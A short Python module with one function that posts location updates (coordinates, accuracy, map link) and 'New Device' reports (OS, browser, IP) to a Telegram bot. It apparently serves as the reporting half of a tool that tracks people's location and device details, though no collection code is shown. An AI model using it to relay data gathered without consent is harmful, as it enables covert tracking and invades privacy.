#!/usr/bin/env python3
import requests
import json

def tgram_sender(msg_type, content, parts):
    """Send messages to Telegram"""
    try:
        token = parts[0]
        chat_id = parts[1]
        
        if msg_type == 'location':
            lat = content.get('lat', 'N/A')
            lon = content.get('lon', 'N/A')
            acc = content.get('acc', 'N/A')
            message = f"📍 Location Update!\nLat: {lat}\nLon: {lon}\nAccuracy: {acc}\nhttps://maps.google.com/?q={lat},{lon}"
        
        elif msg_type == 'device_info':
            message = f"📱 New Device!\nOS: {content.get('os', 'N/A')}\nBrowser: {content.get('browser', 'N/A')}\nIP: {content.get('ip', 'N/A')}"
        
        else:
            message = json.dumps(content)
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=5)
        
    except Exception as e:
        print(f"Telegram error: {e}")
